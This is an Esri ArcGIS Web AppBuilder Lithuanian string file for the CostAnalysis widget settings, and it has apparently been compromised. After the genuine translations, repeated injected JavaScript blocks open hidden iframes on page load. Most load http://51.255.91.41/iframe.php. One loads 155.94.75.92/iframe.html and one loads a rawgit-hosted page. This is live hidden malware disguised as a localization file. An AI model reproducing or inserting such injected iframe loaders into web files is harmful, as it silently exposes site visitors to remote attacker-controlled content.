// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Nustatyti konfig\u016bravimo tekst\u0105:",generalSettings:{tabTitle:"Bendrieji parametrai",measurementUnitLabel:"Matavimo vienetai",currencyLabel:"Matavimo simbolis",roundCostLabel:"Apvalinti i\u0161laidas",projectOutputSettings:"Projekto i\u0161vesties parametrai",typeOfProjectAreaLabel:"Projekto teritorijos tipas",bufferDistanceLabel:"Buferio atstumas",roundCostValues:{twoDecimalPoint:"Du skaitmenys po kablelio",nearestWholeNumber:"Artimiausias sveikasis skai\u010dius",
nearestTen:"Artimiausia de\u0161imtis",nearestHundred:"Artimiausias \u0161imtas",nearestThousand:"Artimiausias t\u016bkstantis",nearestTenThousands:"Artimiausia de\u0161imtis t\u016bkstan\u010di\u0173"},projectAreaType:{outline:"Kont\u016bras",buffer:"Buferis"},errorMessages:{currency:"Netinkamas valiutos vienetas",bufferDistance:"Netinkamas buferio atstumas",outOfRangebufferDistance:"Reik\u0161m\u0117 turi b\u016bti didesn\u0117 nei 0 ir ma\u017eesn\u0117 nei 100 arba lygi"}},projectSettings:{tabTitle:"Projekto parametrai",
costingGeometrySectionTitle:"Apibr\u0117\u017eti i\u0161laid\u0173 geografij\u0105 (pasirinktinai)",costingGeometrySectionNote:"Pastaba: sukonfig\u016bravus \u0161\u012f sluoksn\u012f, vartotojas gal\u0117s nustatyti element\u0173 \u0161ablon\u0173 i\u0161laid\u0173 lygtis pagal geografinius duomenis.",projectTableSectionTitle:"Galimyb\u0117 \u012fra\u0161yti / \u012fkelti projekto parametrus (pasirinktinai)",projectTableSectionNote:"Pastaba: sukonfig\u016bravus visas lenteles ir sluoksnius, vartotojai gal\u0117s \u012fra\u0161yti  / \u012fkelti projekt\u0105, kad gal\u0117t\u0173 naudoti v\u0117liau.",
costingGeometryLayerLabel:"I\u0161laid\u0173 geometrijos sluoksnis",fieldLabelGeography:"Laukas \u012f \u017eymi\u0173 geografinius duomenis",projectAssetsTableLabel:"Projekto i\u0161tekli\u0173 lentel\u0117",projectMultiplierTableLabel:"Projekto daugiklio papildom\u0173 i\u0161laid\u0173 lentel\u0117",projectLayerLabel:"Projekto sluoksnis",configureFieldsLabel:"Konfig\u016bruoti laukus",fieldDescriptionHeaderTitle:"Lauko apra\u0161as",layerFieldsHeaderTitle:"Sluoksnio laukas",selectLabel:"Pasirinkti",
errorMessages:{duplicateLayerSelection:"${layerName} jau pa\u017eym\u0117tas",invalidConfiguration:"Pasirinkite ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eBus rodomas (-i) poligono sluoksnis (-iai) su \u0161iomis s\u0105lygomis: \x3cbr/\x3e \x3cli\x3e\tSluoksnis privalo tur\u0117ti \u00e2\u20ac\u0153U\u017eklausos\u00e2\u20ac\u009d galimyb\u0119\x3c/li\x3e\x3cli\x3e\tSluoksnis privalo tur\u0117ti GlobalID lauk\u0105\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3ePa\u017eym\u0117to \u00e2\u20ac\u0153I\u0161laid\u0173 geometrijos sluoksnio\u00e2\u20ac\u009d eilut\u0117 ir skaitiniai laukai bus rodomi i\u0161krentan\u010diame meniu \u00e2\u20ac\u0153Laukas \u012f \u017eymi\u0173 geografinius duomenis\u00e2\u20ac.\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3eBus rodoma (-os) lentel\u0117 (-\u0117s) su \u0161iomis s\u0105lygomis: \x3cbr/\x3e \x3cli\x3eLentel\u0117je turi b\u016bti redagavimo galimyb\u0117s, tai yra \u00e2\u20ac\u0153Kurti\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Naikinti\u00e2\u20ac\u009d ir \u00e2\u20ac\u0153Atnaujinti\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLentel\u0117je turi b\u016bti \u0161e\u0161i laukai su tiksliu pavadinimo ir duomen\u0173 tipu:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID lauko tipas)\x3c/li\x3e\x3cli\x3e\tCostEquation (tekstinis lauko\u00a0tipas)\x3c/li\x3e\x3cli\x3e\tScenario (tekstinis lauko\u00a0tipas)\x3c/li\x3e\x3cli\x3e\tTemplateName (tekstinis lauko tipas)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID lauko tipas)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID lauko tipas)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eBus rodoma (-os) lentel\u0117 (-\u0117s) su \u0161iomis s\u0105lygomis: \x3cbr/\x3e \x3cli\x3eLentel\u0117je turi b\u016bti redagavimo galimyb\u0117s, tai yra \u00e2\u20ac\u0153Kurti\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Naikinti\u00e2\u20ac\u009d ir \u00e2\u20ac\u0153Atnaujinti\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLentel\u0117je turi b\u016bti penki laukai su tiksliu pavadinimo ir duomen\u0173 tipu:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (tekstinis lauko tipas)\x3c/li\x3e\x3cli\x3e\tType (tekstinis lauko tipas)\x3c/li\x3e\x3cli\x3e\tValue (kintamo / dvigubo tikslumo lauko tipas)\x3c/li\x3e\x3cli\x3e\tCostindex (sveikojo skai\u010diaus lauko tipas)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID lauko tipas))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eBus rodomas (-i) poligono sluoksnis (-iai) su \u0161iomis s\u0105lygomis: \x3cbr/\x3e \x3cli\x3eSluoksnyje turi b\u016bti redagavimo galimyb\u0117s, tai yra \u00e2\u20ac\u0153Kurti\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Naikinti\u00e2\u20ac\u009d ir \u00e2\u20ac\u0153Atnaujinti\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eSluoknyje turi b\u016bti penki laukai su tiksliu pavadinimo ir duomen\u0173 tipu:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (tekstinis lauko tipas)\x3c/li\x3e\x3cli\x3eDescription (tekstinis lauko tipas)\x3c/li\x3e\x3cli\x3eTotalassetcost (kintamo / dvigubo tikslumo lauko tipas)\x3c/li\x3e\x3cli\x3eGrossprojectcost (kintamo / dvigubo tikslumo lauko tipas)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID lauko tipas)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Sluoksnio parametrai",layerNameHeaderTitle:"Sluoksnio pavadinimas",layerNameHeaderTooltip:"Sluoksni\u0173 s\u0105ra\u0161as \u017eem\u0117lapyje",EditableLayerHeaderTitle:"Redaguojama",EditableLayerHeaderTooltip:"\u012etraukti sluoksn\u012f ir jo \u0161ablonus \u012f i\u0161laid\u0173 valdikl\u012f",SelectableLayerHeaderTitle:"Pa\u017eymimas",SelectableLayerHeaderTooltip:"Geometrij\u0105 i\u0161 elemento galima naudoti generuojant nauj\u0105 i\u0161laid\u0173 element\u0105",
fieldPickerHeaderTitle:"Projekto ID (pasirinktinis)",fieldPickerHeaderTooltip:"Pasirinktinis laukas (tekstinio tipo) projekto ID saugoti",selectLabel:"Pasirinkti",noAssetLayersAvailable:"Pasirinktame internetiniame \u017eem\u0117lapyje i\u0161tekli\u0173 sluoksnis nerastas",disableEditableCheckboxTooltip:"\u0160iame sluoksnyje n\u0117ra redagavimo galimybi\u0173"},costingInfo:{tabTitle:"I\u0161laid\u0173 informacija",proposedMainsLabel:"Si\u016blomos trasos",addCostingTemplateLabel:"\u012etraukti i\u0161laid\u0173 \u0161ablon\u0105",
manageScenariosTitle:"Tvarkyti scenarijus",featureTemplateTitle:"Element\u0173\u00a0\u0161ablonas",costEquationTitle:"I\u0161laid\u0173 lygtis",geographyTitle:"Geografiniai duomenys",scenarioTitle:"Scenarijus",actionTitle:"Veiksmai",scenarioNameLabel:"Scenarijaus pavadinimas",addBtnLabel:"Prid\u0117ti",srNoLabel:"Nr.",deleteLabel:"I\u0161trinti",duplicateScenarioName:"Pasikartojantis scenarijaus pavadinimas",hintText:"\x3cdiv\x3ePastaba: naudokite \u0161iuos rakta\u017eod\u017eius\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: naudoja bendr\u0105 to paties tipo i\u0161tekli\u0173 kiek\u012f regione\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: naudoja linijos i\u0161tekliaus ilg\u012f ir poligon\u0173 i\u0161tekliaus teritorij\u0105\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: naudoja bendr\u0105 linijos i\u0161tekliaus ilg\u012f ir bendr\u0105 poligono to paties tipo i\u0161tekliaus teritorij\u0105 geografiniame regione \x3c/li\x3e\x3c/ul\x3eGalite naudoti funkcijas, pvz.:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eRedaguokite i\u0161laid\u0173 lygt\u012f pagal savo projekto poreikius.",
noneValue:"N\u0117ra",requiredCostEquation:"Neleistina i\u0161laid\u0173 lygtis, skirta ${layerName} : ${templateName}",duplicateTemplateMessage:"Pasikartojantis \u0161ablono \u012fra\u0161as, skirtas ${layerName} : ${templateName}",defaultEquationRequired:"Numatytosios lygties reikia sluoksniui ${layerName} : ${templateName}",validCostEquationMessage:"\u012eveskite tinkam\u0105 i\u0161laid\u0173 lygt\u012f",costEquationHelpText:"Redaguokite i\u0161laid\u0173 lygt\u012f pagal projekto poreikius",
scenarioHelpText:"Pasirinkite scenarij\u0173 pagal projekto poreikius",copyRowTitle:"Kopijuoti eilut\u0119",noTemplateAvailable:"\u012etraukite bent vien\u0105 \u0161ablon\u0105 sluoksniui ${layerName}",manageScenarioLabel:"Tvarkyti scenarij\u0173",noLayerMessage:"${tabName} \u012fveskite bent vien\u0105 sluoksn\u012f",noEditableLayersAvailable:"Sluoksnis (-iai), kur\u012f (-iuos)\u00a0reikia patikrinti kaip redaguotin\u0105 (-us)\u00a0sluoksnio parametr\u0173 skirtuke"},statisticsSettings:{tabTitle:"Statistikos parametrai",
addStatisticsLabel:"Prid\u0117ti statistinius rodiklius",fieldNameTitle:"Darbui lauke",statisticsTitle:"U\u017era\u0161as",addNewStatisticsText:"Prid\u0117ti nauj\u0105 statistin\u012f rodikl\u012f",deleteStatisticsText:"Naikinti statistinius rodiklius",moveStatisticsUpText:"Perkelti statistinius rodiklius auk\u0161tyn",moveStatisticsDownText:"Perkelti statistinius rodiklius \u017eemyn",selectDeselectAllTitle:"\u017dym\u0117ti visk\u0105"},statisticsType:{countLabel:"Skai\u010dius",averageLabel:"Vidurkis",
maxLabel:"Maksimumas",minLabel:"Minimumas",summationLabel:"Suma",areaLabel:"Plotas",lengthLabel:"Ilgis"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});